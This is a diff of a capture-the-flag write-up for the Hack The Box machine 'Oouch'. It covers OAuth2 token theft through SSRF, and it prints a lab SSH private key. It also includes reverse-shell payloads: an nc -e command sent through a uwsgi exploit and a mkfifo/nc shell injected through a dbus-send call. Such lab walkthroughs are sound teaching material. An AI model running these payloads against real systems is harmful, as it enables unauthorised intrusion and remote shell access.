@@ -4,6 +4,8 @@
 
 ![](../../.gitbook/assets/1-oouch-infocard.png)
 
+This had difficulty Linux machine taught me a lot about the internal workings of a federated access control system, specifically an implementation of Oauth2.  Persistence and the ability to take error messages and learn from them were necessary to progress through this machine.
+
 ## Useful Skills and Tools
 
 ## Enumeration
@@ -249,7 +251,9 @@ I sent the following link to the admin, and hoped that there was some way that t
 
 After getting a message thanking me for my feedback to the admin, I used the link `http://consumer.oouch.htb:5000/oauth/login` from the `/oauth` page to authorize the account connection.
 
-> _Note: You have to log in fast otherwise the token expires!_
+{% hint style="info" %}
+Note: You have to log in fast otherwise the token expires!
+{% endhint %}
 
 ![](../../.gitbook/assets/screenshot_2020-06-10_15-42-54.png)
 
@@ -265,7 +269,7 @@ I noticed on the `/documents` page I now had the following items listed:
 > * o\_auth\_notes.txt    /api/get\_user -&gt; user data. oauth/authorize -&gt; Now also supports GET method.
 > * todo.txt            Chris mentioned all users could obtain my ssh key. Must be a joke...
 
-I now had some credentials for a `develop` user but I wasn't sure where to use them. 
+I now had some credentials for a `develop` user but I wasn't sure where to use them, other than they were good for registering an application. 
 
 I turned to gobuster once again to search for more directories, and found `/oauth/applications/register/` which gave me an HTTP basic authentication login prompt where I used the develop creds from the `/documents` page.  
 
@@ -283,7 +287,7 @@ _I forgot the port on my redirect URL while filling out the request the first ti
 
 ![](../../.gitbook/assets/screenshot_2020-06-11_02-20-00.png)
 
-> _Side note: After creating an app and clicking "Go Back" it prompts for basic authentication with the text “Oouch Admin Only” at URL `http://authorization.oouch.htb:8000/oauth/applications/`. The `develop` creds did not work here._
+Side note: After creating an app and clicking "Go Back" it prompts for basic authentication with the text “Oouch Admin Only” at URL `http://authorization.oouch.htb:8000/oauth/applications/`. The `develop` creds did not work here.
 
 ![](../../.gitbook/assets/oouch20.png)
 
@@ -324,7 +328,7 @@ Upgrade-Insecure-Requests: 1
 DNT: 1
 ```
 
-I then sent an authorize request to the server to connect to the app I 'created', which I hoped would redirect to my netcat listener:
+I then sent an authorization request to the server to connect to the app I 'created', which I hoped would redirect to my netcat listener:
 
 ```http
 GET /oauth/authorize/?client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234&grant_type=authorization-code&client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS HTTP/1.1
@@ -347,7 +351,7 @@ listening on [any] 1234 ...
 connect to [10.10.14.253] from (UNKNOWN) [10.10.14.253] 53300
 ```
 
-The connection only sent this error message, but it was enough to see that it worked how I wanted and gave me a clue as to what I needed to send to get a proper response.
+The connection only sent an error message, but it was enough to see that it worked how I wanted and gave me a clue as to what I needed to send to get a proper response.
 
 ```http
 GET /?error=invalid_request&error_description=Missing+response_type+parameter. HTTP/1.1
@@ -361,7 +365,7 @@ DNT: 1
 Host: 10.10.14.253:1234
 ```
 
-After seeing that I could get a connection from the server, I once again tried sending my request in a link to the admin on the `http://consumer.oouch.htb:5000/contact` page to see if we could use SSRF again to get any further info:
+After seeing that I could get a connection from the server, I once again tried sending my request in a link to the admin on the `http://consumer.oouch.htb:5000/contact` page to see if we could use SSRF again to get any further info.
 
 ```bash
 http://authorization.oouch.htb:8000/oauth/authorize/?client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234&grant_type=authorization-code&client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS
@@ -383,7 +387,7 @@ I now had a session cookie from the admin.  Since I was already logged in as `qt
 
 ![](../../.gitbook/assets/screenshot_2020-06-11_02-51-40.png)
 
-It worked! Now that I had another higher privilege oauth2 account, I decided it was time to try to get an authorization token from `/oauth/token`  to access the API `/oauth/get_user` I saw earlier.
+It worked! Now that I had a higher privilege oauth2 account, I decided it was time to try out those endpoint links to get an authorization token from `/oauth/token`  to access the API `/oauth/get_user` I saw earlier.
 
 Next I did some more oauth2 research, in particular on authenticating to APIs:
 
@@ -449,7 +453,7 @@ Vary: Authorization
 
 ### Finding user creds
 
-I got the access token! I then tried to use the token to get info from the `/oauth/get_user` API, but got back nothing useful. The note on qtc's `/documents` page mentioned easy **user** access to the **SSH** key...
+I got the access token! I then tried to use the token to get info from the `/oauth/get_user` API, but got back nothing useful. After playing around with it, I thought back to the the note on qtc's `/documents` page that mentioned easy user access to the SSH key and  substituted `get_user` with `get_ssh`. 
 
 ```http
 GET /api/get_ssh/?access_token=A8lhuPCNBxtMZwFJ9vgpdh1ntW94zg HTTP/1.1
@@ -465,7 +469,7 @@ DNT: 1
 Cache-Control: max-age=0
 ```
 
-And I got an SSH key for the user `qtc`!  Annoyingly, it was on a single line and had a lot of `\n` characters in it that had to be fixed.
+I got an SSH key for the user `qtc`!  Annoyingly, it was on a single line and had a lot of `\n` characters in it that had to be fixed.
 
 ```http
 HTTP/1.1 200 OK
@@ -477,9 +481,11 @@ Vary: Authorization, Cookie
 {"ssh_server": "consumer.oouch.htb", "ssh_user": "qtc", "ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----"}
 ```
 
-The next step was to use SSH to login to the machine. The command _`ssh -i <private_key_file>` lets you use a private key to login._
+The next step was to use SSH to login to the machine. The command `ssh -i <private_key_file>` __lets you use a private key to login.
 
-> _Note: Don't forget to `chmod 600` your ssh keys before use!_
+{% hint style="info" %}
+Note: Don't forget to**`chmod 600`** your SSH keys before use!
+{% endhint %}
 
 ### User.txt
 
@@ -516,7 +522,7 @@ I got the `user.txt`! There was also a hidden file named `.note.txt` that mentio
 
 ### Enumeration as user - `qtc`
 
-While enumerating I found a `htb.oouch.Block.conf` in the dbus configuration files:
+While enumerating I found a configuration file named `htb.oouch.Block.conf` in the Dbus configuration files.  I figured this must be related to that hidden note I found about an IPS using Dbus.  
 
 ```bash
 qtc@oouch:/etc/dbus-1/system.d$ ls
@@ -547,9 +553,9 @@ qtc@oouch:/etc/dbus-1/system.d$ cat htb.oouch.Block.conf
 </busconfig>
 ```
 
-So the www-data can send and recieve on dbus using `htb.oouch.Block`...but not sure how to use this right now.
+So the user `www-data` can send and receive on dbus using `htb.oouch.Block`, but I wasn't sure how to use this right then. 
 
-As seen in my `ip a` output Docker is running...can I connect?
+In the output from the command `ip a` I noticed that there were Docker containers running in the `172.17.0.1/16` range.  I wondered if `qtc` was able to connect to one.  
 
 ```bash
 3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default
@@ -564,9 +570,11 @@ As seen in my `ip a` output Docker is running...can I connect?
        valid_lft forever preferred_lft forever
 ```
 
-The answer was yes! After connecting through ssh with the same key for user `qtc`, I began enumerating the docker container. It took a few tries to find an IP I could connect to \(`172.18.0.5`\).
+The answer was yes! It took a few tries to find an IP I could connect to \(`172.18.0.5`\), though.  
 
-> _Side note: After going back in to validate my notes, I noticed that the final octet of the container IP seems to be randomized. It was `172.178.0.4` the next time I did it._
+{% hint style="info" %}
+Side note: After going back in to validate my notes, I noticed that the final octet of the container IP seems to be randomized. It was **`172.178.0.4`** the next time I did it.
+{% endhint %}
 
 ```bash
 qtc@oouch:~/.ssh$ ssh qtc@172.18.0.5 -i id_rsa 
@@ -615,7 +623,7 @@ drwxr-xr-x   1 root root 4096 Jan 30 00:00 usr
 drwxr-xr-x   1 root root 4096 Feb 11 17:36 var
 ```
 
-The `/code` folder looked interesting...
+After connecting through SSH with the same OpenSSH key for user `qtc`, I began enumerating the docker container.   The `/code` folder in the root looked interesting...
 
 ```text
 qtc@aeb4525789d8:/$ cd code
@@ -635,7 +643,11 @@ drwxr-xr-x 5 root root 4096 Feb 11 17:34 oouch
 -rwxr-xr-x 1 root root   89 Feb 11 17:34 start.sh
 -rw-rw-rw- 1 root root    0 Jun 11 10:36 urls.txt
 -rw-r--r-- 1 root root  163 Feb 11 17:34 uwsgi.ini
-qtc@aeb4525789d8:/code$
+```
+
+There were lots of interesting looking files in this directory.
+
+```bash
 qtc@aeb4525789d8:/code$ cat requirements.txt 
 Flask==1.0.2
 Flask-Bootstrap==3.3.7.1
@@ -650,10 +662,12 @@ geojson==2.5.0
 jsonschema==2.6.0
 simplejson==3.16.0
 mysqlclient==1.4.4
-qtc@aeb4525789d8:/code$ cat config.py
 ```
 
+The file `requirements.txt` gave a listing of the dependencies and versions of the software needed to run the websites, so perhaps there was something I could use to find an exploit.
+
 ```python
+qtc@aeb4525789d8:/code$ cat config.py
 import os
 
 basedir = os.path.abspath(os.path.dirname(__file__))
@@ -666,7 +680,7 @@ class Config(object):
     SECRET_KEY = os.environ.get('SECRET_KEY') or 'klarabubuklarabubuklarabubuklarabubu'
 ```
 
-The MySQL creds in `config.py` file looked interesting...though I'm not sure if it was another route or a rabbit hole. I never used it.
+The MySQL creds in `config.py` file looked interesting...though I'm not sure if it was another route to root or a rabbit hole. I forgot about it until after I had gotten root and never used them.
 
 ```bash
 qtc@aeb4525789d8:/code$ cat uwsgi.ini 
@@ -682,7 +696,7 @@ vacuum = true
 die-on-term = true
 ```
 
-The uwsgi service was running on `oouch`, and the `uwsgi.ini` file is in the docker. Apparently it runs in the context of the `www-data` user, which we saw earlier in the `htb.oouch.Block.conf`. I checked to see if there are any exploits and found: [https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi\_exp.py](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py)
+The `uwsgi` service was running on the `oouch`box, and I also found the `wsgi.ini` file in the Docker container. Apparently it runs in the context of the `www-data` user, which we saw earlier in the `htb.oouch.Block.conf`. I checked to see if there were any exploits for this service and found: [https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi\_exp.py](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py)
 
 I then tried to run the exploit to try to get a reverse shell:
 
@@ -692,9 +706,11 @@ usage: uwsgi.py [-h] [-m [{http,tcp,unix}]] -u [UWSGI_ADDR] -c [COMMAND]
 uwsgi.py: error: the following arguments are required: -u/--uwsgi
 ```
 
-The uwsgi service runs from the docker container so I couldn't figure out how to run this exploit remotely. I then copied it to the container \(along with nc since it wasn't installed.\)
+The `uwsgi` service runs from the docker container so I couldn't figure out how to get this exploit to connect to my Kali machine easily. I used SCP to copy the exploit into the container \(along with a version of nc since it wasn't installed.\)
 
-> _Note: make sure to put the `:` after the IP and before the folder name, it won't work otherwise._
+{% hint style="info" %}
+Note: make sure to put the `:` after the IP and before the folder name; it won't work otherwise.
+{% endhint %}
 
 ```bash
 qtc@oouch:/dev/shm$ scp -i /home/qtc/.ssh/id_rsa ./uwsgi.py qtc@172.18.0.5:/tmp/
@@ -724,19 +740,20 @@ Traceback (most recent call last):
 ModuleNotFoundError: No module named 'bytes'
 ```
 
-Fortunately commenting out the lines that referenced the `bytes` module solved the problem and the code ran. I still wasn't able to get a shell back to my box from the docker container, so I tried sending it to the `oouch` box instead.
-
-...it worked!
+Fortunately commenting out the lines that referenced the `bytes` module solved the problem and the code ran. I still wasn't able to get a shell back to my box from the docker container, so tried sending it to the `oouch` box instead.
 
 ```bash
 qtc@aeb4525789d8:/tmp$ python ./uwsgi.py -m unix -u uwsgi.socket -c "/tmp/nc -e /bin/sh 172.18.0.1 1234"
 [*]Sending payload.
 ```
 
-And, I got a connection back on `qtc@oouch`.
+...it worked, and, I got a connection on my netcat listener I set up back on `qtc@oouch`. 
+
+{% hint style="info" %}
+_If you are wondering how I was able to do this, I had another terminal open and set up another SSH connection to the_ **`oouch`** _machine from my localhost.  If you didn't know, you can login to the same machine multiple times with SSH \(not sure what the technical limit may be\)._  
+{% endhint %}
 
 ```bash
-qtc@oouch:/dev/shm$ nc -nvlp 1234
 listening on [any] 1234 ...
 connect to [172.18.0.1] from (UNKNOWN) [172.18.0.5] 53934
 whoami && hostname
@@ -744,9 +761,7 @@ www-data
 aeb4525789d8
 ```
 
-Now that I was `www-data`, I needed to see if that dbus config I found earlier could come in handy. It mentioned interacting with dbus and the `htb.oouch.block` app. The code below was from `routes.py` found in the `/code/oouch` directory of the docker container. It shows the information needed to craft our message to DBus.
-
-_I also think this was the filter that was blocking my early XSS attempts on the `/contact` page._
+Now that I was logged in as `www-data`, I needed to see if that dbus configuration file I found earlier could come in handy. It mentioned interacting with dbus and the `htb.oouch.block` app. The code below was from `routes.py` found in the `/code/oouch` directory of the docker container and showed the information needed to craft my message to DBus. _\(I also think this was the filter that was blocking my early XSS attempts on the `/contact` page\)._
 
 ```python
 # First apply our primitive xss filter
@@ -761,9 +776,9 @@ _I also think this was the filter that was blocking my early XSS attempts on the
             return render_template('hacker.html', title='Hacker')
 ```
 
-I found some examples of how to craft the message at [https://gist.github.com/ukBaz/d7cd0c4b9e7078c89980a3db2bbad98b](https://gist.github.com/ukBaz/d7cd0c4b9e7078c89980a3db2bbad98b). There is also a related POC that exploits a kernel module \(which we didn't need to do for this, thankfully!\) at [https://www.exploit-db.com/exploits/36820](https://www.exploit-db.com/exploits/36820).
+I found some examples of how to craft the exploit message on GitHub at [https://gist.github.com/ukBaz/d7cd0c4b9e7078c89980a3db2bbad98b](https://gist.github.com/ukBaz/d7cd0c4b9e7078c89980a3db2bbad98b). There was also a related POC that exploits a kernel module \(which I didn't do for this challenge\) at [https://www.exploit-db.com/exploits/36820](https://www.exploit-db.com/exploits/36820).
 
-The example POC code:
+The example exploit command and reply were as follows:
 
 ```bash
 dbus-send --print-reply --system --dest=com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.KVMTest string:/dev/sda dict:string:string:DISPLAY,"foo",XAUTHORITY,"foo",LD_PRELOAD,"/tmp/test.so"
@@ -771,7 +786,7 @@ dbus-send --print-reply --system --dest=com.ubuntu.USBCreator /com/ubuntu/USBCre
 method return sender=:1.4364 -> dest=:1.7427 reply_serial=2
 ```
 
-My test code:
+My test code and the services reply:
 
 ```bash
 dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"echo whoami;"
@@ -780,17 +795,21 @@ method return time=1591881935.932055 sender=:1.2 -> destination=:1.1283 serial=7
    string "Carried out :D"
 ```
 
-The reply `string "Carried out :D"` looks like I am the right track, though I didn't see any echo.
+The reply `string "Carried out :D"` made it look like I was on the right track, even though I didn't see any echo.  I figured that the standard-out was not being sent back to my terminal and that was why I wasn't able to see my test work.
 
 I then tried substituting the `echo whoami` command for a reverse shell:
 
-> `dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.253 1234 >/tmp/f"`
+```bash
+dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.253 1234 >/tmp/f"
+```
 
-I still couldn't reach my home box from the container...but maybe I could send this shell to `qtc@oouch` again.
+I still couldn't reach my home box from the container...but I thought that maybe I could send this shell to `qtc@oouch` again.
 
-> _Note: It also needed `;` on the end for some reason!!_
+{% hint style="info" %}
+Note: It also needed `;` on the end of the string for some reason!! This certainly took a little while to troubleshoot and discover.
+{% endhint %}
 
-### Getting a shell
+### Getting a root shell
 
 My final working exploit:
 
@@ -801,7 +820,11 @@ method return time=1591882762.569865 sender=:1.2 -> destination=:1.1325 serial=1
    string "Carried out :D"
 ```
 
-I'm in!
+I'm in!  The service spawned a reverse shell connection back to my waiting netcat listener on the `oouch` machine.  
+
+{% hint style="info" %}
+Looking back, I probably could have used an SSH tunnel to connect through from my local host, but I didn't know how to do that back when I first rooted this machine.  
+{% endhint %}
 
 ### Root.txt
 
